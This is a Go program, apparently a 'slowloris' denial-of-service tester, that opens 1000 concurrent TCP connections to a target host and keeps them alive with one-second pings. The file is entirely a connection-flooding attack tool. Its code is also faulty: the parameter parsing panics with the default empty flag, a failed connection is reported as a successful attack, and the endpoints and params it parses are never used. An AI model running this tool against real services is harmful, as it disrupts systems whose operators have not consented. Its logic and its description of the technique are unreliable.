package main

import (
	"flag"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

func dial(host string) bool {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		log.Println("error connecting:", err)

		return true
	}

	defer conn.Close()

	log.Println("Connected to host!")

	for {
		_, err = conn.Write([]byte("Hello, server!"))
		if err != nil {
			log.Println("error writing to connection:", err)

			break
		}

		ticker := time.NewTicker(1 * time.Second) // Change the interval as needed
		defer ticker.Stop()

		for range ticker.C {
			// send ping message
			_, er := conn.Write([]byte("Ping\n"))
			if er != nil {
				log.Println("Error writing to connection:", er)

				return true
			}

			log.Println("Ping sent to server")
		}
	}

	return false
}

func main() {
	log.SetOutput(os.Stdout)

	var (
		hostFlag      = flag.String("host", "localhost", "target host address")
		endpointsFlag = flag.String("endpoints", "/", "target specific endpoints")
		paramsFlag    = flag.String("params", "", "system parameters for testing")
	)

	flag.Parse()

	endpoints := strings.Split(*endpointsFlag, ",")
	paramSet := strings.Split(*paramsFlag, "&")

	params := make(map[string]string)

	for _, item := range paramSet {
		parts := strings.Split(item, "=")
		params[parts[0]] = parts[1]
	}

	log.Println(hostFlag)
	log.Println(endpoints)
	log.Println(params)

	wg := sync.WaitGroup{}

	for i := 0; i < 1000; i++ {
		wg.Add(1)

		go func() {
			if dial(*hostFlag) {
				log.Println("slowloris attack succeed, service is out of control")

				os.Exit(1)
			}

			wg.Done()
		}()
	}

	wg.Wait()

	log.Println("safe against slowloris attack!")

	os.Exit(0)
}
